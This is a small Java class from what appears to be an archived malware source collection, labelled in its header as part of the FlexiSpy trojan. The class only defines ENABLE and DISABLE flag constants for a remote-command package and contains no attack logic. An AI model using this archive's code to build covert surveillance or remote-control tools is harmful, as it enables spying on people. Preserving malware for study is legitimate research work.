/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.rmtcmd;

public class EdFlag {
	
	public static final EdFlag DISABLE = new EdFlag(0);
	public static final EdFlag ENABLE = new EdFlag(1);
	private int id;
	
	private EdFlag(int id) {
		this.id = id;
	}

	public int getId() {
		return id;
	}
}
